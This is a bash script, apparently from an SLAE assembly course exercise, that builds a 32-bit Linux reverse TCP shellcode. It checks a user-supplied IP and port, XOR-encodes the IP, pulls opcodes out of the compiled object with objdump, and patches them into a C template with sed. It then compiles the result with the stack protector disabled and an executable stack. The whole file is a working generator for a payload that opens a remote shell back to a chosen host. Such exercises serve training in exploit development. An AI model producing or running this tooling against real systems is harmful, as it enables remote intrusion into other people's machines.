#!/bin/bash
#Author:SLAE-755 

port=4444
IP="127.0.0.1"

#clean previous compiled files
rm -f reverse_tcp_shellcode reverse_tcp_shellcode.o shellcode

#UTILITY FUNCTION TO CHECK IF AN IP IS VALID
#IPs containing 255 are deliberately excluded
function valid_ip()
{
    local  ip=$1
    local  stat=1

    if [[ $ip =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
        OIFS=$IFS
        IFS='.'
        ip=($ip)
        IFS=$OIFS
        [[ ${ip[0]} -lt 255 && ${ip[1]} -lt 255 \
            && ${ip[2]} -lt 255 && ${ip[3]} -lt 255 ]]
        stat=$?
    fi
    return $stat
}



#CHECK PARAMETERS: $1 -> IP   -    $2 -> PORT
if [ $# -ne 2 ]
	then
		echo -e "[!] No IP and port provided..\n    Using Default IP 127.0.0.1 and default port 4444"
		echo "    Usage: $0 192.168.1.55 5677"
else
	if [ $2 -lt 1024 ] || [ $2 -gt 65535 ]
		then
			echo "[+] No valid port provided.. Using Default port 4444"
			echo "[+] Custom port must be greater than 1024 and lower than 65536"
		else
			port=$2
			echo "[+] Building shellcode with Custom port $1"
	fi

	if valid_ip $1
		then
			IP=$1
			echo "[+] Building shellcode with Custom IP $1"

		else
			echo "[+] No valid IP provided.. Using Default IP 127.0.0.1"
	fi

fi



#CONVERT IP TO HEX AND THEN XOR ENCODING IT (KEY IS FF or 255) USING THE NETWORK FORMAT
IFS='.' read -r -a array <<< "$IP"
encoded_ip=""
for element in "${array[@]}"
do
	ip_segment=$(printf "0x%X" $element)
	encoded_ip=$encoded_ip$(printf "0x%02x\n" "$(($ip_segment ^ 0xff))")
done

encoded_ip=$(echo $encoded_ip | sed  "s/0x/\\\x/g")
echo "[+] XOR Encoded IP is: $encoded_ip"





shellcode_name="reverse_tcp_shellcode"
./compile.sh $shellcode_name


port=$(printf "%X" $port)
port_hex=$(echo $port | awk '{printf("\\x%s\\x%s",substr($0,1,2),substr($0,3,4)); }' | sed "s/\\\/\\\\\\\\/g")


payload=$(objdump -d $shellcode_name|grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g')
cp shellcode_template.c shellcode.c
payload2=$(echo $payload | sed "s/\\\/\\\\\\\/g")

#injecting shellcode
sed  -i "s/XXX/$payload2/g" shellcode.c

#changing port in the shellcode
sed  -i "s/\\\x11\\\x5c/$port_hex/g" shellcode.c

#changing IP in the shellcode
encoded_ip=$(echo $encoded_ip |  sed "s/\\\/\\\\\\\\/g")
sed  -i "s/\\\x80\\\xff\\\xff\\\xfe/$encoded_ip/g" shellcode.c


gcc -m32 -fno-stack-protector -z execstack shellcode.c -o shellcode
